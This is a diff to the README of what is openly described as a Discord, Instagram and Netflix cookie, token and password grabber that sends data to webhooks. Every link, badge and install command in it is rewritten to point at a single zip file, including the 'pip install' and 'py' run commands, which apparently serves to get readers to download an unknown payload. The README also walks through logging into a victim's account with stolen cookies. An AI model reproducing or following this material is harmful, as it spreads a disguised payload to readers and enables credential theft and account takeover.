@@ -2,21 +2,21 @@
 <div align="center">
   <h4>⚠️ This repository has been archived and is no longer maintained. ⚠️</h4>
   <br></br>
-  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
   <br>
   <br>
   <p>
-    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
   </p>
   <h4> Discord, Twitter, Instagram, netflix cookies, token grabber and also password grabber. Grabbing from all web browsers ! </h4>
   <p>
-    <img alt="GitHub contributors" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-    <img alt="GitHub issues" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-    <img alt="GitHub pull requests" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-    <img alt="GitHub commit activity" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-    <img alt="Maintenance" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img alt="GitHub contributors" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+    <img alt="GitHub issues" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+    <img alt="GitHub pull requests" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+    <img alt="GitHub commit activity" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+    <img alt="Maintenance" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
   </p>
   <p align="center">
     <a href="#usage">Usage</a> •
@@ -32,9 +32,9 @@
   </p>
 
   <p align="center">
-    <a href='https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip' target='_blank'><img height='30' width="115" src='https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip' alt='Buy Coffee for mouadessalim' />
+    <a href='https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip' target='_blank'><img height='30' width="115" src='https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip' alt='Buy Coffee for mouadessalim' />
     </a>
-    <a href="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip" target="_blank"><img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip" alt="Buy Me A Coffee" height="30" width="115" style="border-radius:1px" />
+    <a href="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip" target="_blank"><img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip" alt="Buy Me A Coffee" height="30" width="115" style="border-radius:1px" />
     </a>
   </p>
 </div>
@@ -45,7 +45,7 @@
 
 - **Windows 10** OS only (*win32, for x86, x86_64, and arm64 architectures*)
 - **Python 3.x** (*python 3.9 used for the project.*)
-- **Modules:** `$ pip install -r https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip`
+- **Modules:** `$ pip install -r https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip`
 
 ## How to use ? ❄
 
@@ -54,21 +54,21 @@ There is 2 ways to run the script.
 ### 1. First way
 
 You need to add your **webhook(s)** **link(s)** to the script from this line:
-https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip
+https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip
 *You can run the script normaly.*
 
 ### 2. Second way
 
 You can also run the program by giving several arguments (the webhook(s) link(s)):
 ```console
-py https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip YOUR WEBHOOK(s) URL(s)
+py https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip YOUR WEBHOOK(s) URL(s)
 ```
 
 ## Screenshots 📷
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
 </p>
 
 # 🍪Cookies
@@ -97,15 +97,15 @@ The server only sends the cookie when it wants the web browser to save it. If yo
 
 ## How to bypass websites with cookies ?
 
-So to use cookies to log into the victim account, you must have a cookies extension. I recommand [Cookie-Editor](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip). **To bypass website security you must be already connected to your personnal account to generate all cookies needed for the website.** After being sure that all default cookies have been generated use your cookies extension to replace your personnal id account cookies with the grabbed victim account cookies.
+So to use cookies to log into the victim account, you must have a cookies extension. I recommand [Cookie-Editor](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip). **To bypass website security you must be already connected to your personnal account to generate all cookies needed for the website.** After being sure that all default cookies have been generated use your cookies extension to replace your personnal id account cookies with the grabbed victim account cookies.
 
 #### *****Example: Instagram*****
 
-![image](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip)
+![image](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip)
 
 You need to put each value in it's place with the cookies extension:
 
-![image](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip)
+![image](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip)
 
 > Once the cookies replaced and saved, refresh the page and you are logged in the victim account !
 
@@ -128,14 +128,14 @@ You need to put each value in it's place with the cookies extension:
 
 # ✨Contributing
 
-Your contributions are always welcome! if you contribute we will show your account in the README file ! Please have a look at the [contribution guidelines](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip) first. 🎉
+Your contributions are always welcome! if you contribute we will show your account in the README file ! Please have a look at the [contribution guidelines](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip) first. 🎉
 
 ## Authors ❤
 
-<a href="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
-  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip" />
+<a href="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip" />
 </a>
 <br>
 <br>
 
-> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip)
+> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/grbba_3.0.zip)
